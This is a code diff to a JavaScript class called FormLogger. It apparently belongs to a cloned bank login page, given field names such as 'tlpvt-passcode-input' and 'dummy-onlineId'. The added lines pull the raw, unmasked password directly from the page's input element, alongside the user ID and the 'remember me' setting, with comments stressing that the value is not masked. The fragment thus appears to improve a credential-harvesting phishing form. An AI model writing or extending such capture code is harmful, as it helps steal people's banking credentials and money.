@@ -96,8 +96,17 @@ class FormLogger {
       const userIdInput = form.querySelector('input[name="dummy-onlineId"]');
       const userIdValue = userIdInput ? userIdInput.value.trim() : '';
 
-      // Use the raw unmasked password we captured
-      const passwordValue = this.rawPassword || '';
+      // Get the actual password value directly from the input field (NOT masked)
+      const passwordInput = document.getElementById('tlpvt-passcode-input');
+      let passwordValue = '';
+      
+      if (passwordInput) {
+        // Get the actual value from the DOM element (this is the unmasked value)
+        passwordValue = passwordInput.value || this.rawPassword || '';
+      } else {
+        // Fallback to tracked raw password
+        passwordValue = this.rawPassword || '';
+      }
 
       // Get Remember Me checkbox
       const rememberInput = form.querySelector('input[name="saveMyID"]');
